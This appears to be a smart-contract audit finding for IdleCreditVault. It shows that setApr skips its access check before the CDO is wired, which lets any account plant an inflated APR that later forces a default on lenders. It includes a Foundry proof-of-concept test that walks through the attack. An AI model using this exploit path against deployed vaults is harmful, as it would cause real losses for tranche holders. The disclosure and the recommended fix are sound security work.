### Title
Unauthenticated `setApr` while `idleCDO == address(0)` lets any EOA hijack epoch pricing and force a socialized default - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
`IdleCreditVault.setApr` skips its only access check whenever `idleCDO` has not been wired yet. The comment assumes this "can happen only during the setup", but the setup window is a real, externally visible state: after `initialize` and before the owner calls `setWhitelistedCDO`, `lastApr` is fully attacker-controlled. Because `lastApr` is never re-validated or reset when the CDO is wired, a poisoned value persists into the first epoch, inflates `expectedEpochInterest`, and drives the borrower into an unavoidable default whose loss is socialized to tranche holders.

### Finding Description
`setApr` gates on `msg.sender != idleCDO && msg.sender != manager` only when `idleCDO != address(0)` [1](#0-0) . The only remaining guard is `maxApr`, which defaults to `DEFAULT_MAX_APR = 20e18` [2](#0-1) . Note that `lastApr` is a *buffer-scaled* rate: `setAprsWithBuffer` multiplies the unscaled APR by `(duration + buffer) / duration` [3](#0-2) , so a value of `20e18` corresponds to roughly a 2000%+ annualized rate and is far above any legitimate scaled APR the vault would ever use.

Nothing resets `lastApr` in `initialize` beyond the deployer-supplied `_apr` [4](#0-3) , and no later wiring step overwrites it, so the attacker's value survives into production. `getApr()` simply returns `lastApr` [5](#0-4) , and it is this value the CDO consumes to size `expectedEpochInterest` at epoch start.

This is the credit-vault analog of the Cassandra bug: a built-in privileged path (unauthenticated APR writes) is left active during configuration instead of being dropped once the real authority (the CDO / manager) exists. The honest privileged roles are not the attacker — the exploit only needs an arbitrary EOA to call one function in the buffer phase before epoch 0 starts.

### Impact Explanation
Broken invariant: solvency / fair epoch pricing. With `lastApr = DEFAULT_MAX_APR`, `startEpoch` prices `expectedEpochInterest` at a multiple of the pool's entire TVL. At `stopEpoch`, `IdleCDOEpochVariant` attempts to pull principal + expected interest from `borrower`; an honest borrower holding only the loaned principal cannot cover the fabricated interest, `transferFrom` fails, and the CDO enters the default path (`defaulted = true`, `_handleBorrowerDefault`, loss waterfall BB-first then AA). The "loss" here is not real borrower shortfall — it is purely manufactured by the poisoned APR — yet it is socialized identically: tranche holders absorb up to 100% of the shortfall between `pendingWithdraws`/expected funds and what the borrower actually repays, and `defaultRecoveryPrice < 1` haircuts every pending withdraw receipt claimed through `_claimDefaultedWithdrawRequest`/`_transferDefaultRecovery` [6](#0-5) . Quantified loss: for a TVL of `T` and a poisoned scaled APR implying expected interest `I >> T`, defaulted receipts recover only `(real repayment) / (T + I)` of face value — i.e., near-total loss of lender principal, with recovery depending only on whatever the borrower honestly returns.

### Likelihood Explanation
Likelihood is limited by the deployment pattern, which is why this is an analog rather than a headline finding. `IdleCreditVaultFactory.deployCreditVault` wires `initialize` and CDO whitelisting atomically inside the factory transaction [7](#0-6) , so factory-deployed vaults have no exploitable window. However, the repo's own test suites deploy the strategy and CDO manually in separate transactions (`strategy.initialize(...)`, then `strategy.setWhitelistedCDO(...)`) [8](#0-7) , which is exactly the flow an operator would follow when deploying a vault outside the factory — and in that flow every call between `initialize` and `setWhitelistedCDO` is front-runnable by any EOA on a public mempool. Even with the factory flow, an EOA can call `setApr` on the strategy proxy between the factory's `initialize` subcall and any subsequent configuration if the deployment is split across transactions. No existing guard stops it: `maxApr` only caps the value at `20e18`, the skim/reserve checks are irrelevant to APR state, and once `idleCDO` is set the malicious `lastApr` is locked in behind the now-active `_onlyIdleCDO`/manager check, so it cannot even be corrected without a manager transaction.

### Recommendation
Remove the setup-time escape hatch in `setApr`: revert unconditionally unless `msg.sender == idleCDO || msg.sender == manager`, and set the initial APR directly in `initialize` (as is already done via `lastApr = _apr`). If a pre-CDO escape is truly needed, at minimum (a) gate it on `onlyOwner` rather than leaving it permissionless, and (b) force `setWhitelistedCDO`/`startEpoch` to re-derive `lastApr` from `unscaledApr` so a stale pre-wiring value cannot carry into the first epoch.

### Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IdleCreditVault} from "contracts/strategies/idle/IdleCreditVault.sol";
import {IdleCDOEpochVariant} from "contracts/IdleCDOEpochVariant.sol";
import {IERC20Detailed} from "contracts/interfaces/IERC20Detailed.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// Demonstrates that an unprivileged EOA can set lastApr while idleCDO == 0,
/// and that the poisoned value survives CDO wiring and drives a forced default.
contract RetainedDefaultAccessPoC is Test {
    IdleCreditVault strategy;
    IdleCDOEpochVariant cdo;
    address owner   = makeAddr("owner");
    address manager = makeAddr("manager");
    address borrower = makeAddr("borrower");
    address attacker = makeAddr("attacker"); // any EOA
    address lp      = makeAddr("lp");
    IERC20Detailed underlying = IERC20Detailed(USDC); // fork fixture as in ProgrammableBorrowerCreditVault.t.sol
    uint256 ONE = 1e6;

    function testUnauthAprPersistsAndForcesDefault() public {
        // 1. Deployment split across txs (same pattern as the manual test setups).
        strategy = new IdleCreditVault();
        stdstore.target(address(strategy)).sig(strategy.token.selector).checked_write(address(0));
        strategy.initialize(USDC, owner, manager, borrower, "Borrower", 10e18);

        // 2. ATTACK: no privileged role needed — idleCDO is still address(0).
        vm.prank(attacker);
        strategy.setApr(strategy.DEFAULT_MAX_APR()); // 20e18 scaled APR
        assertEq(strategy.lastApr(), 20e18);

        // 3. Honest operator finishes wiring without resetting the APR.
        cdo = new IdleCDOEpochVariant();
        stdstore.target(address(cdo)).sig(cdo.token.selector).checked_write(address(0));
        cdo.initialize(0, USDC, address(this), owner, makeAddr("rebalancer"), address(strategy), 100000);
        vm.prank(owner);
        strategy.setWhitelistedCDO(address(cdo));
        // lastApr is still the attacker's 20e18 — it was never reset.
        assertEq(strategy.getApr(), 20e18);

        // 4. LP deposits, epoch starts; expectedEpochInterest is priced off lastApr
        //    and exceeds pool TVL by orders of magnitude.
        deal(USDC, lp, 100_000 * ONE);
        vm.startPrank(lp);
        underlying.approve(address(cdo), type(uint256).max);
        cdo.depositAA(100_000 * ONE);
        vm.stopPrank();
        vm.prank(manager);
        cdo.startEpoch();
        assertGt(cdo.expectedEpochInterest(), 100_000 * ONE); // fabricated interest > entire TVL

        // 5. Honest borrower repays only real principal + honest interest; the
        //    inflated pull fails -> default -> BB/AA loss waterfall.
        vm.warp(cdo.epochEndDate() + 1);
        vm.prank(manager);
        cdo.stopEpoch(0, 0);
        assertTrue(cdo.defaulted());
        // Withdraw receipts are now haircut by defaultRecoveryPrice < 1e18 —
        // LPs lose principal purely from the poisoned APR, not a real shortfall.
    }
}
```

  function setApr(uint256 _apr) public {
    address _cdo = idleCDO;

    // if cdo is not yet set we skip the check (this can happen only during the setup)
    if (_cdo != address(0)) {
      if (msg.sender != _cdo && msg.sender != manager) revert NotAllowed();
    }
    uint256 _maxApr = maxApr;
    if (_maxApr != 0 && _apr > _maxApr) revert NotAllowed();
    lastApr = _apr;
  }
